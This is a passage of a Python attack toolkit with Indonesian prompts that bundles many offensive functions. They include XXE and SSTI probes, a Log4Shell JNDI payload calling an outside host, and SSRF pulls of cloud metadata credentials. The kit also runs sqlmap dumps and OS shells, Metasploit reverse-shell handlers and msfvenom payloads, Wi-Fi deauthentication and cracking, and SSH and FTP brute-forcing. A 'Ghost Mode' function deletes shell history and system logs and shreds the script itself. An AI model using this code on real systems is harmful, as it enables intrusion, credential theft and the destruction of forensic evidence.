                    for x in list(set(m))[:3]: info(f"  {str(x)[:120]}"); RESULTS["api_keys"].append({"type":name,"key":str(x)[:200]})
        except: pass

def jwt_analyzer(silent=False):
    if not silent: voice("JWT analyzer...")
    token = ask("JWT token (atau 'scan')")
    if token.lower() == 'scan':
        url = norm(ask("URL target"))
        try:
            r = requests.get(url, headers=HEADERS, timeout=8)
            tokens = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', r.text)
            if tokens: token = tokens[0]
        except: return
    try:
        parts = token.split('.')
        def pad(s): return s + '=' * (-len(s) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        info(f"Header: {json.dumps(header)}"); info(f"Payload: {json.dumps(payload)}")
        if header.get('alg','').lower() == 'none': vuln("alg=none VULNERABLE!")
        RESULTS["jwt"].append({"header":header,"payload":payload})
    except: pass

def graphql_scan(url=None, silent=False):
    if not silent: voice("GraphQL...")
    if not url: url = norm(ask("URL GraphQL"))
    try:
        r = requests.post(url, json={"query":"{__schema{types{name}}}"}, headers=HEADERS, timeout=10)
        if '__schema' in r.text: vuln("INTROSPECTION ENABLED"); RESULTS["graphql"].append({"introspection":r.text[:2000]})
    except: pass

def env_leak_scan(url=None, silent=False):
    if not silent: voice("Env leak...")
    if not url: url = norm(ask("URL target"))
    for p in ['/.env','/.env.local','/config.php','/wp-config.php.bak','/.git/config','/backup.sql']:
        try:
            r = requests.get(urljoin(url,p), headers=HEADERS, timeout=5, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 10:
                vuln(f"{p} ({len(r.text)} bytes)"); RESULTS["leaked_env"].append({"path":p,"sample":r.text[:500]})
        except: pass

def s3_scanner(domain=None, silent=False):
    if not silent: voice("S3 hunter...")
    if not domain:
        d = ask("Domain"); domain = urlparse(d).netloc if '://' in d else d
    base = domain.split('.')[0]
    for n in [base, f"{base}-backup", f"{base}-dev", f"{base}-assets"]:
        for region in ['', 'us-east-1']:
            host = f"{n}.s3.{region+'.' if region else ''}amazonaws.com"
            try:
                r = requests.get(f"https://{host}/", timeout=5)
                if r.status_code == 200 and '<ListBucketResult' in r.text:
                    vuln(f"S3 OPEN: {host}"); RESULTS["s3_buckets"].append({"host":host})
            except: pass

def sourcemap_hunter(url=None, silent=False):
    if not silent: voice("Sourcemap...")
    if not url: url = norm(ask("URL target"))
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', r.text)
        for js in list(set(js_files))[:10]:
            map_url = urljoin(url, js) + '.map'
            try:
                r2 = requests.get(map_url, headers=HEADERS, timeout=5)
                if r2.status_code == 200 and 'sources' in r2.text[:200].lower():
                    vuln(f"SOURCE MAP: {map_url}"); RESULTS["source_maps"].append({"map":map_url})
            except: pass
    except: pass

def post_exploit(url=None, silent=False):
    if not silent: voice("Post-exploit...")
    if not url: url = norm(ask("URL target"))
    for ep in ['/actuator/env','/actuator/health','/swagger.json','/api-docs','/metrics']:
        try:
            r = requests.get(urljoin(url,ep), headers=HEADERS, timeout=5)
            if r.status_code == 200:
                if any(k in r.text.lower() for k in ['password','secret','token','api_key']):
                    vuln(f"SENSITIVE: {ep}"); RESULTS["post_exploit"].append({"endpoint":ep,"data":r.text[:2000]})
                else: warn(f"{ep} (200)")
        except: pass

def xxe_tester(url=None, silent=False):
    if not silent: voice("XXE...")
    if not url: url = norm(ask("URL XML endpoint"))
    p = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xx SYSTEM "file:///etc/passwd">]><x>&xx;</x>'
    try:
        r = requests.post(url, data=p, headers={**HEADERS,"Content-Type":"application/xml"}, timeout=10)
        if "root:x:0:0" in r.text: vuln("XXE VULN!"); RESULTS["post_exploit"].append({"type":"XXE"})
    except: pass

def ssti_tester(url=None, silent=False):
    if not silent: voice("SSTI...")
    if not url: url = norm(ask("URL target"))
    if '?' not in url: return
    for name,p in {"Jinja2":"{{7*7}}","Twig":"{{7*'7'}}"}.items():
        try:
            r = requests.get(url + quote(p), headers=HEADERS, timeout=8)
            if "49" in r.text: vuln(f"SSTI [{name}]"); RESULTS["post_exploit"].append({"type":"SSTI","engine":name})
        except: pass

def log4shell_scan(url=None, silent=False):
    if not silent: voice("Log4Shell...")
    if not url: url = norm(ask("URL target"))
    for h in ['User-Agent','X-Forwarded-For','Referer']:
        try:
            test = HEADERS.copy(); test[h] = "${jndi:ldap://x.dnslog.cn/a}"
            requests.get(url, headers=test, timeout=8); ok(f"{h} -> tested")
        except: pass

# CLOUD
def k8s_scanner(host=None, silent=False):
    if not silent: voice("K8s scan...")
    if not host:
        h = ask("Host/IP"); host = h.replace('http://','').replace('https://','').split(':')[0]
    for port in [6443,8443,8080,10250,2379]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
            if s.connect_ex((host, port)) == 0:
                warn(f"Port {port} OPEN")
                scheme = 'https' if port in [6443,8443,10250] else 'http'
                for ep in ['/api/v1','/api/v1/pods','/version']:
                    try:
                        r = requests.get(f"{scheme}://{host}:{port}{ep}", headers=HEADERS, timeout=4, verify=False)
                        if r.status_code == 200 and any(k in r.text for k in ['"kind"','"items"']):
                            vuln(f"ANON: {ep}"); RESULTS["kubernetes"].append({"url":f"{scheme}://{host}:{port}{ep}"})
                    except: pass
            s.close()
        except: pass

def docker_scanner(host=None, silent=False):
    if not silent: voice("Docker scan...")
    if not host:
        h = ask("Host/IP"); host = h.replace('http://','').replace('https://','').split(':')[0]
    for port in [2375,2376]:
        try:
            r = requests.get(f"http://{host}:{port}/version", timeout=5)
            if r.status_code == 200 and 'Version' in r.text:
                vuln(f"DOCKER API OPEN ({port})"); RESULTS["docker"].append({"host":host,"port":port})
                r2 = requests.get(f"http://{host}:{port}/containers/json?all=1", timeout=5)
                if r2.status_code == 200: warn(f"{len(r2.json())} containers!")
                break
        except: pass

def aws_metadata(silent=False):
    if not silent: voice("AWS metadata...")
    base = ask("URL SSRF (kosong=169.254.169.254)") or "http://169.254.169.254"
    for p in ["/latest/meta-data/iam/security-credentials/","/latest/user-data"]:
        try:
            r = requests.get(f"{base}{p}", headers=HEADERS, timeout=5)
            if r.status_code == 200 and len(r.text) > 5:
                vuln(f"{p}\n    {r.text[:300]}"); RESULTS["aws_metadata"].append({"path":p,"data":r.text[:2000]})
        except: pass

def gcp_metadata(silent=False):
    if not silent: voice("GCP metadata...")
    base = ask("URL SSRF (kosong=169.254.169.254)") or "http://169.254.169.254"
    try:
        r = requests.get(f"{base}/computeMetadata/v1/project/project-id",
                         headers={**HEADERS,"Metadata-Flavor":"Google"}, timeout=5)
        if r.status_code == 200: vuln(f"GCP: {r.text[:200]}"); RESULTS["gcp_metadata"].append({"data":r.text[:500]})
    except: pass

def azure_metadata(silent=False):
    if not silent: voice("Azure metadata...")
    base = ask("URL SSRF (kosong=169.254.169.254)") or "http://169.254.169.254"
    try:
        r = requests.get(f"{base}/metadata/instance?api-version=2021-02-01",
                         headers={**HEADERS,"Metadata":"true"}, timeout=5)
        if r.status_code == 200: vuln(f"Azure: {r.text[:200]}"); RESULTS["azure_metadata"].append({"data":r.text[:500]})
    except: pass

def etcd_scanner(host=None, silent=False):
    if not silent: voice("etcd scan...")
    if not host:
        h = ask("Host/IP"); host = h.replace('http://','').replace('https://','').split(':')[0]
    for port in [2379,2380]:
        try:
            r = requests.get(f"http://{host}:{port}/version", timeout=5)
            if r.status_code == 200: vuln(f"ETCD OPEN: {r.text[:200]}"); RESULTS["etcd"].append({"host":host,"port":port})
        except: pass

def consul_scanner(host=None, silent=False):
    if not silent: voice("Consul scan...")
    if not host:
        h = ask("Host/IP"); host = h.replace('http://','').replace('https://','').split(':')[0]
    try:
        r = requests.get(f"http://{host}:8500/v1/kv/?recurse", timeout=5)
        if r.status_code == 200 and r.text:
            vuln(f"CONSUL KV: {r.text[:300]}"); RESULTS["consul"].append({"host":host,"kv":r.text[:2000]})
    except: pass

def vault_scanner(host=None, silent=False):
    if not silent: voice("Vault scan...")
    if not host:
        h = ask("Host/IP"); host = h.replace('http://','').replace('https://','').split(':')[0]
    try:
        r = requests.get(f"http://{host}:8200/v1/sys/seal-status", timeout=5)
        if r.status_code == 200: vuln(f"VAULT: {r.text[:200]}"); RESULTS["vault"].append({"status":r.json()})
    except: pass

# NETWORK/WIFI
def nmap_tool():
    voice("Nmap...")
    if not check_tool("nmap"):
        if ask("Install nmap? (y/n)").lower() == 'y': install_tool("nmap")
    target = ask("Target")
    print(f"\n{B}[1]{W} Quick {B}[2]{W} Intense {B}[3]{W} Full {B}[4]{W} UDP {B}[5]{W} OS {B}[6]{W} Vuln {B}[7]{W} Sweep")
    m = ask("Mode")
    cmds = {'1':f"nmap -T4 -F {target}",'2':f"nmap -T4 -A -v {target}",
            '3':f"nmap -p- -T4 {target}",'4':f"sudo nmap -sU -T4 {target}",
            '5':f"sudo nmap -O -T4 {target}",'6':f"nmap --script vuln -T4 {target}",
            '7':f"nmap -sn {target}"}
    os.system(cmds.get(m, f"nmap {target}"))

def wireshark_tool():
    voice("TShark...")
    if not check_tool("tshark"):
        if ask("Install tshark? (y/n)").lower() == 'y': install_tool("tshark")
    if not check_tool("tshark"): return
    print(f"\n{B}[1]{W} List iface {B}[2]{W} Capture file {B}[3]{W} HTTP {B}[4]{W} DNS")
    m = ask("Mode")
    if m == '1': os.system("tshark -D")
    elif m == '2':
        iface = ask("Interface") or "wlan0"; out = ask("File") or "capture.pcap"
        os.system(f"sudo tshark -i {iface} -c 10 -w {out}")
    elif m == '3':
        iface = ask("Interface") or "wlan0"; os.system(f"sudo tshark -i {iface} -Y http -c 20")
    elif m == '4':
        iface = ask("Interface") or "wlan0"; os.system(f"sudo tshark -i {iface} -Y dns -c 20")

def aircrack_tool():
    voice("Aircrack-ng...")
    if not check_tool("aircrack-ng"):
        if ask("Install? (y/n)").lower() == 'y': install_tool("aircrack-ng")
    if not check_tool("aircrack-ng"): return
    print(f"\n{B}[1]{W} Cek iface {B}[2]{W} Monitor {B}[3]{W} Airodump {B}[4]{W} Deauth {B}[5]{W} Crack")
    m = ask("Mode")
    if m == '1': os.system("sudo airmon-ng")
    elif m == '2':
        iface = ask("Interface") or "wlan0"; os.system(f"sudo airmon-ng start {iface}")
    elif m == '3':
        iface = ask("Monitor") or "wlan0mon"; os.system(f"sudo airodump-ng {iface}")
    elif m == '4':
        iface = ask("Monitor") or "wlan0mon"; bssid = ask("BSSID")
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {iface}")
    elif m == '5':
        cap = ask("File .cap"); os.system(f"aircrack-ng {cap} -w /usr/share/wordlists/rockyou.txt")

def pedora_tool():
    voice("Pedora (SQL auto)...")
    target = norm(ask("URL target (?id=1)"))
    if check_tool("sqlmap"):
        print(f"\n{B}[1]{W} Full auto {B}[2]{W} Enum DB {B}[3]{W} Dump {B}[4]{W} OS Shell {B}[5]{W} Bypass WAF")
        m = ask("Mode")
        cmds = {'1': f"sqlmap -u '{target}' --batch --random-agent --dump-all --risk=3 --level=5",
            '2': f"sqlmap -u '{target}' --batch --dbs",
            '3': f"sqlmap -u '{target}' --batch -D {ask('DB')} -T {ask('Table')} --dump",
            '4': f"sqlmap -u '{target}' --batch --os-shell",
            '5': f"sqlmap -u '{target}' --batch --tamper=space2comment,between"}
        os.system(cmds.get(m, cmds['1']))
    else:
        if ask("Install sqlmap? (y/n)").lower() == 'y': install_tool("sqlmap")

def ghost_tracker():
    voice("Ghost Tracker...")
    print(f"\n{B}[1]{W} IP {B}[2]{W} Domain {B}[3]{W} HP {B}[4]{W} Email {B}[5]{W} GPS")
    m = ask("Mode")
    if m == '1':
        ip = ask("IP")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
            for k,v in r.items(): info(f"{k}: {v}")
            if 'lat' in r: info(f"Maps: https://www.google.com/maps?q={r['lat']},{r['lon']}")
        except: pass
    elif m == '2':
        d = ask("Domain")
        try:
            ip = socket.gethostbyname(d)
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
            for k,v in r.items(): info(f"{k}: {v}")
        except: pass
    elif m == '3':
        hp = ask("Nomor"); info(f"WA: https://wa.me/{hp}"); info(f"TG: https://t.me/+{hp}")
    elif m == '4':
        em = ask("Email"); info(f"HIBP: https://haveibeenpwned.com/account/{em}")
    elif m == '5':
        ip = ask("IP")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
            if 'lat' in r:
                info(f"Lat: {r['lat']}, Lon: {r['lon']}")
                info(f"Maps: https://www.google.com/maps?q={r['lat']},{r['lon']}")
        except: pass

def hapus_jejak():
    voice("Ghost Mode - hapus jejak...")
    warn("Hapus semua log! Ctrl+C batal.")
    try: time.sleep(3)
    except: warn("Dibatalkan"); return
    cleaned = []
    try:
        if is_termux(): os.system("rm -f ~/.bash_history ~/.zsh_history 2>/dev/null")
        else: os.system("history -c; rm -f ~/.bash_history ~/.zsh_history 2>/dev/null")
        cleaned.append("Shell history")
    except: pass
    try:
        if is_termux(): os.system("rm -rf /data/data/com.termux/files/usr/var/log/* 2>/dev/null")
        else:
            os.system("sudo rm -rf /var/log/auth.log /var/log/syslog 2>/dev/null")
            os.system("sudo journalctl --rotate 2>/dev/null; sudo journalctl --vacuum-time=1s 2>/dev/null")
        cleaned.append("Logs")
    except: pass
    try: os.system("rm -rf /tmp/* /var/tmp/* 2>/dev/null"); cleaned.append("Temp")
    except: pass
    try:
        os.system("find ~ -name '__pycache__' -type d -exec rm -rf {} + 2>/dev/null")
        os.system("rm -rf ~/.cache/pip ~/.cache/* 2>/dev/null"); cleaned.append("Cache")
    except: pass
    if ask("Hapus report NOXA? (y/n)").lower() == 'y':
        for f in ['noxa_report.json','extracted_data.json']:
            if os.path.exists(f): os.system(f"shred -u {f} 2>/dev/null || rm -f {f}"); cleaned.append(f)
    if ask("Self-destruct script? (y/n)").lower() == 'y':
        time.sleep(5); os.system("shred -u noxa_suite_v12.py 2>/dev/null")
        ok("Hancur. Sampai jumpa, mulia."); sys.exit(0)
    for c in cleaned: ok(c)

# v6 OSINT
def cve_lookup():
    voice("CVE Lookup...")
    kw = ask("Keyword (contoh: apache)")
    try:
        r = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={kw}&resultsPerPage=20", timeout=15)
        if r.status_code == 200:
            for v in r.json().get('vulnerabilities',[])[:20]:
                cve = v.get('cve',{}); cve_id = cve.get('id','N/A')
                desc = cve.get('descriptions',[{}])[0].get('value','N/A')
                metrics = cve.get('metrics',{}); score = "N/A"
                if 'cvssMetricV31' in metrics: score = metrics['cvssMetricV31'][0]['cvssData']['baseScore']
                elif 'cvssMetricV2' in metrics: score = metrics['cvssMetricV2'][0]['cvssData']['baseScore']
                vuln(f"{cve_id} (CVSS: {score})"); info(desc[:200])
                RESULTS["cve"].append({"id":cve_id,"score":score,"desc":desc[:300]})
    except Exception as e: err(str(e))

def metasploit_wrapper():
    voice("Metasploit...")
    if not check_tool("msfconsole"):
        warn("Install metasploit")
        if is_termux(): os.system("pkg install unstable-repo -y && pkg install metasploit -y")
        else:
            if ask("Install? (y/n)").lower() == 'y': os.system("sudo apt install metasploit-framework -y")
    if not check_tool("msfconsole"): return
    print(f"\n{B}[1]{W} Search {B}[2]{W} Handler {B}[3]{W} Exploit {B}[4]{W} Payload {B}[5]{W} Custom")
    m = ask("Mode")
    if m == '1': os.system(f"msfconsole -q -x 'search {ask('Keyword')}; exit'")
    elif m == '2':
        lhost = ask("LHOST"); lport = ask("LPORT") or "4444"
        payload = ask("Payload") or "linux/x64/meterpreter/reverse_tcp"
        os.system(f"msfconsole -q -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")
    elif m == '3':
        target = ask("RHOST"); module = ask("Module")
        os.system(f"msfconsole -q -x 'use {module}; set RHOSTS {target}; run; exit'")
    elif m == '4':
        lhost = ask("LHOST"); lport = ask("LPORT") or "4444"
        payload = ask("Payload") or "android/meterpreter/reverse_tcp"; out = ask("Output") or "payload"
        os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {out}")
    elif m == '5': os.system(f"msfconsole -q -x '{ask('Command')}; exit'")

def exploitdb_search():
    voice("Exploit-DB...")
    kw = ask("Keyword")
    try:
        r = requests.get("https://raw.githubusercontent.com/offensive-security/exploitdb/master/files_exploits.csv", timeout=15)
        if r.status_code == 200:
            count = 0
            for line in r.text.split('\n'):
                if kw.lower() in line.lower() and count < 20:
                    parts = line.split(',')
                    if len(parts) >= 3:
                        vuln(f"EDB-{parts[0]}"); info(','.join(parts[2:5])[:200])
                        info(f"https://www.exploit-db.com/exploits/{parts[0]}")
                        RESULTS["exploits"].append({"id":parts[0],"desc":','.join(parts[2:5])[:200]})
                        count += 1
    except: pass

def hash_identifier():
    voice("Hash Identifier...")
    h = ask("Hash").strip(); length = len(h)
    is_hex = all(c in '0123456789abcdefABCDEF' for c in h)
    types = []
    if length == 32 and is_hex: types = ["MD5","MD4","NTLM","LM"]
    elif length == 40 and is_hex: types = ["SHA1","MySQL5","RIPEMD160"]
    elif length == 56 and is_hex: types = ["SHA224"]
    elif length == 64 and is_hex: types = ["SHA256","SHA3-256"]
    elif length == 96 and is_hex: types = ["SHA384"]
    elif length == 128 and is_hex: types = ["SHA512","Whirlpool"]
    elif h.startswith('$2a$') or h.startswith('$2b$') or h.startswith('$2y$'): types = ["Bcrypt"]
    elif h.startswith('$1$'): types = ["MD5crypt"]
    elif h.startswith('$5$'): types = ["SHA256crypt"]
    elif h.startswith('$6$'): types = ["SHA512crypt"]
    elif h.startswith('$argon'): types = ["Argon2"]
    if types:
        ok("Possible:")
        for t in types: info(t); RESULTS["hash_id"].append(t)
    else: warn(f"Tidak dikenal (len: {length}, hex: {is_hex})")

def hash_cracker_wordlist():
    voice("Hash Cracker...")
    h = ask("Hash"); htype = ask("Type (md5/sha1/sha256/sha512)")
    wl = ask("Wordlist (default: wordlist.txt)") or "wordlist.txt"
    if not os.path.exists(wl):
        common = ['password','123456','admin','letmein','qwerty','abc123','admin123','root',
                  'toor','pass','password1','welcome','monkey','dragon','master','indonesia']
        with open(wl,'w') as f:
            for w in common: f.write(w+'\n')
    funcs = {'md5':hashlib.md5,'sha1':hashlib.sha1,'sha256':hashlib.sha256,'sha512':hashlib.sha512}
    func = funcs.get(htype.lower())
    if not func: err("Type tidak dikenal"); return
    with open(wl,'r',encoding='utf-8',errors='ignore') as f:
        for i,word in enumerate(f,1):
            word = word.strip()
            if func(word.encode()).hexdigest() == h.lower():
                ok(f"CRACKED: {word} (attempt #{i})"); return
    err("Tidak ketemu.")

def subdomain_takeover(domain=None, silent=False):
    if not silent: voice("Subdomain Takeover...")
    if not domain:
        d = ask("Domain"); domain = d.replace('http://','').replace('https://','').split('/')[0]
    subs = ['www','mail','blog','dev','test','api','cdn','static','app','beta']
    sigs = {"github.io":"There isn't a GitHub Pages site","herokuapp.com":"No such app",
            "s3.amazonaws.com":"NoSuchBucket","azurewebsites.net":"Error 404",
            "wordpress.com":"Do you want to register"}
    for sub in subs:
        full = f"{sub}.{domain}"
        try:
            r = requests.get(f"http://{full}", timeout=5)
            for svc,sig in sigs.items():
                if sig.lower() in r.text.lower():
                    vuln(f"TAKEOVER: {full} -> {svc}"); RESULTS["takeover"].append({"subdomain":full,"service":svc}); break
        except: pass

def email_osint():
    voice("Email OSINT...")
    email = ask("Email")
    info(f"HIBP: https://haveibeenpwned.com/account/{email}")
    info(f"Dehashed: https://dehashed.com/search?query={email}")
    if '@' in email:
        domain = email.split('@')[1]
        try:
            result = subprocess.run(['dig','+short','MX',domain], capture_output=True, timeout=5, text=True)
            if result.stdout: info(f"MX: {result.stdout.strip()}")
        except: pass
    RESULTS["email_osint"].append({"email":email})

def phone_osint():
    voice("Phone OSINT...")
    phone = re.sub(r'[^0-9]', '', ask("Nomor HP"))
    if phone.startswith('62'):
        prefix = phone[2:5]
        ops = {'811':'Telkomsel','812':'Telkomsel','813':'Telkomsel','814':'Indosat',
               '815':'Indosat','816':'Indosat','817':'XL','818':'XL','819':'XL',
               '831':'Axis','838':'Axis','895':'Tri','896':'Tri'}
        info(f"Country: Indonesia | Operator: {ops.get(prefix,'Unknown')}")
    info(f"WA: https://wa.me/{phone}"); info(f"TG: https://t.me/+{phone}")
    info(f"Truecaller: https://www.truecaller.com/search/id/{phone}")
    RESULTS["phone_osint"].append({"phone":phone})

def username_hunter():
    voice("Username Hunter...")
    username = ask("Username")
    sites = {"GitHub":f"https://github.com/{username}","Twitter":f"https://x.com/{username}",
        "Instagram":f"https://instagram.com/{username}","TikTok":f"https://tiktok.com/@{username}",
        "Reddit":f"https://reddit.com/user/{username}","Telegram":f"https://t.me/{username}",
        "Medium":f"https://medium.com/@{username}","Pinterest":f"https://pinterest.com/{username}",
        "Twitch":f"https://twitch.tv/{username}","Steam":f"https://steamcommunity.com/id/{username}"}
    for name,url in sites.items():
        try:
            r = requests.get(url, headers=HEADERS, timeout=6)
            if r.status_code == 200 and 'not found' not in r.text.lower()[:2000]:
                ok(f"{name}: {url}"); RESULTS["username_hits"].append({"site":name,"url":url})
            else: err(f"{name}")
        except: err(f"{name}")

def wifi_handshake_cracker():
    voice("WiFi Handshake Cracker...")
    cap = ask("File .cap"); wl = ask("Wordlist (default: /usr/share/wordlists/rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(cap): err("File tidak ada"); return
    os.system(f"aircrack-ng {cap} -w {wl}")

def wordlist_generator():
    voice("Wordlist Generator...")
    print(f"\n{B}[1]{W} Basic {B}[2]{W} Numeric {B}[4]{W} Mutation {B}[5]{W} Leet")
    m = ask("Mode"); out = ask("Output (default: wordlist.txt)") or "wordlist.txt"
    if m == '1':
        words = ['password','123456','admin','letmein','qwerty','abc123','admin123','root','toor','pass']
        with open(out,'w') as f:
            for w in words: f.write(w+'\n')
        ok(f"{len(words)} kata")
    elif m == '2':
        mx = int(ask("Max (default 99999)") or "99999")
        with open(out,'w') as f:
            for i in range(mx+1): f.write(f"{i}\n")
        ok(f"{mx+1} angka")
    elif m == '4':
        kw = ask("Keyword"); muts = [kw, kw.upper(), kw.capitalize(), kw+'123', kw+'!', kw+'2025', kw+'2026']
        for i in range(10): muts += [f"{kw}{i}", f"{i}{kw}"]
        with open(out,'w') as f:
            for m_ in set(muts): f.write(m_+'\n')
        ok(f"{len(set(muts))} variasi")
    elif m == '5':
        kw = ask("Kata"); lm = {'a':'4','e':'3','i':'1','o':'0','s':'5','t':'7'}
        variants = {kw, ''.join(lm.get(c,c) for c in kw.lower())}
        for i in ['1','12','123','!','2025']: variants.add(kw+i)
        with open(out,'w') as f:
            for v in variants: f.write(v+'\n')
        ok(f"{len(variants)} variasi")

def port_knocking():
    voice("Port Knocking...")
    host = ask("Host"); seq = ask("Sequence (7000,8000,9000)")
    try: ports = [int(p.strip()) for p in seq.split(',')]
    except: return
    for i,p in enumerate(ports,1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
            r = s.connect_ex((host,p))
            ok(f"[{i}] Port {p}: {'OPEN' if r==0 else 'sent'}"); s.close(); time.sleep(0.5)
        except: pass

# v7
def ssh_bruteforce():
    voice("SSH Bruteforce...")
    try: import paramiko
    except:
        warn("Install paramiko"); os.system("pip install paramiko 2>/dev/null")
        try: import paramiko
        except: return
    host = ask("Host/IP target"); port = int(ask("Port (default 22)") or "22")
    user = ask("Username (default: root)") or "root"; wl = ask("Wordlist (default: wordlist.txt)") or "wordlist.txt"
    if not os.path.exists(wl):
        with open(wl,'w') as f:
            for p in ['root','admin','password','123456','toor','pass','qwerty']: f.write(p+'\n')
    info(f"Brute SSH {host}:{port} user={user}")
    client = paramiko.SSHClient(); client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(wl,'r',errors='ignore') as f:
        for i, pw in enumerate(f, 1):
            pw = pw.strip()
            if not pw: continue
            try:
                client.connect(host, port=port, username=user, password=pw, timeout=5, banner_timeout=5, auth_timeout=5)
                ok(f"CRACKED! user={user} pass={pw}"); RESULTS["brute_hits"].append({"type":"ssh","host":host,"user":user,"pass":pw})
                client.close(); return
            except paramiko.AuthenticationException: err(f"[{i}] {user}:{pw}")
            except Exception as e: err(str(e))
    err("Tidak ketemu.")

def ftp_bruteforce():
    voice("FTP Bruteforce...")
    from ftplib import FTP
    host = ask("Host/IP"); port = int(ask("Port (default 21)") or "21")
    user = ask("Username (default: anonymous)") or "anonymous"; wl = ask("Wordlist") or "wordlist.txt"
    if not os.path.exists(wl):
        with open(wl,'w') as f:
            for p in ['anonymous','ftp','admin','password','123456','root','test']: f.write(p+'\n')
    info(f"Brute FTP {host}:{port}")
    with open(wl,'r',errors='ignore') as f:
        for i, pw in enumerate(f, 1):
            pw = pw.strip()
            try:
                ftp = FTP(); ftp.connect(host, port, timeout=5); ftp.login(user, pw)
                ok(f"CRACKED! {user}:{pw}"); RESULTS["brute_hits"].append({"type":"ftp","host":host,"user":user,"pass":pw})
                ftp.quit(); return
            except Exception as e:
                if '530' in str(e): err(f"[{i}] {user}:{pw}")
                else: warn(str(e))
    err("Tidak ketemu.")

def wpscan_wrapper():
    voice("WordPress Scanner...")
    url = ask("URL WordPress")
    if not url.startswith('http'): url = 'http://' + url
    info(f"WP Scan {url}")
    endpoints = ['/wp-login.php','/wp-json/wp/v2/users','/xmlrpc.php','/wp-content/plugins/','/readme.html','/wp-admin/','/?author=1']
    for ep in endpoints:
        try:
            r = requests.get(url + ep, headers=HEADERS, timeout=8, allow_redirects=False)
            if r.status_code in [200,301,302,403]:
                ok(f"{ep} ({r.status_code})")
                if ep == '/wp-json/wp/v2/users' and r.status_code == 200:
                    try:
                        for u in r.json(): vuln(f"User: {u.get('slug','?')} - {u.get('name','?')}")
                    except: pass
        except: pass
    if check_tool("wpscan"): info("Running WPScan..."); os.system(f"wpscan --url {url} --enumerate vp,vt,u --no-banner --random-user-agent")
    else: warn("Install wpscan: gem install wpscan")

def smb_enum():
    voice("SMB Enumeration...")
    host = ask("Host/IP"); info(f"SMB enumeration {host}")
    if check_tool("smbclient"): os.system(f"smbclient -L //{host} -N 2>&1 | head -30")
    elif check_tool("nmap"): os.system(f"nmap -p445 --script smb-enum-shares,smb-enum-users {host}")
    else:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
            if s.connect_ex((host, 445)) == 0: vuln("Port 445 OPEN")
            s.close()
        except: pass

def snmp_scanner():
    voice("SNMP Scanner...")
    host = ask("Host/IP"); communities = ['public','private','cisco','admin','internal']
    info(f"SNMP scan {host}")
    if check_tool("snmpwalk"):
        for c in communities: info(f"Community: {c}"); os.system(f"snmpwalk -v2c -c {c} {host} 1.3.6.1.2.1.1 2>&1 | head -10")
    else: warn("Install snmp: apt install snmp")

def dns_zone_transfer():
    voice("DNS Zone Transfer (AXFR)...")
    domain = ask("Domain"); info(f"Testing AXFR for {domain}")
    if check_tool("dig"):
        result = subprocess.run(['dig','+short','NS',domain], capture_output=True, timeout=10, text=True)
        for ns in result.stdout.strip().split('\n'):
            if not ns: continue
            ns = ns.rstrip('.'); info(f"Trying NS: {ns}")
            r = subprocess.run(['dig', 'AXFR', domain, f'@{ns}'], capture_output=True, timeout=15, text=True)
            if len(r.stdout) > 500: vuln(f"ZONE TRANSFER SUCCESS on {ns}!"); print(r.stdout[:2000]); return
            else: err(f"{ns}: refused")
    else: warn("Install dnsutils")

def ssl_tls_scanner():
    voice("SSL/TLS Scanner...")
    host = ask("Host (contoh: example.com)"); port = int(ask("Port (default 443)") or "443")
    info(f"SSL/TLS scan {host}:{port}")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(10); s.connect((host, port))
            cert = s.getpeercert(); cipher = s.cipher(); version = s.version()
        ok(f"Protocol: {version}"); ok(f"Cipher: {cipher[0]} ({cipher[2]} bits)")
        info(f"Subject: {dict(x[0] for x in cert['subject'])}")
        info(f"Issuer: {dict(x[0] for x in cert['issuer'])}")
        info(f"Valid: {cert['notBefore']} -> {cert['notAfter']}")
        warn("Vulnerability checks:")
        if version in ['TLSv1','TLSv1.1']: vuln(f"Weak protocol: {version}")
        if 'RC4' in cipher[0]: vuln("Weak cipher RC4")
        if cipher[2] and cipher[2] < 128: vuln(f"Weak key: {cipher[2]} bits")
    except Exception as e: err(str(e))

def shodan_search():
    voice("Shodan Search...")
    api_key = ask("Shodan API key (kosong = browser)"); query = ask("Query (contoh: apache country:ID)")
    if not api_key: info(f"Buka: https://www.shodan.io/search?query={query.replace(' ','%20')}"); return
    try:
        r = requests.get(f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}", timeout=15)
        if r.status_code == 200:
            data = r.json(); ok(f"Total: {data.get('total',0)}")
            for m in data.get('matches',[])[:10]:
                vuln(f"{m.get('ip_str')}:{m.get('port')}"); info(f"  {m.get('org','N/A')} | {m.get('product','N/A')}")
        else: err(f"{r.status_code}")
    except Exception as e: err(str(e))

def virustotal_lookup():
    voice("VirusTotal Lookup...")
    api_key = ask("VirusTotal API key (kosong = browser)"); target = ask("IP/Domain/Hash")
    if not api_key:
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', target): info(f"https://www.virustotal.com/gui/ip-address/{target}")
        elif re.match(r'^[a-fA-F0-9]{32,64}$', target): info(f"https://www.virustotal.com/gui/file/{target}")
        else: info(f"https://www.virustotal.com/gui/domain/{target}")
        return
    try:
